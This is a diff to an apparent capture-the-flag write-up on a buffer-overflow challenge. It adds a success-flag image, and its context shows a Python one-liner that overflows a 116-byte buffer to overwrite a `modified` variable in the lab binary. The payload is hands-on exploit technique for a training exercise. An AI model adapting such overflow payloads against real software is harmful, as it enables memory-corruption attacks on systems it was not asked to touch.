@@ -53,6 +53,7 @@ The goal of this challenge is to change the `modified` variable and see the succ
     ```sh
     echo -e $(python -c 'import struct; buffer_size = 116; new_value = 1; payload = b"A" * buffer_size + struct.pack("<I", new_value); print(payload.decode("latin-1"))') | ./bin
     ```
+![Succsess Flag](./images/image.png)
 
 ### Tools Used
 - `file`
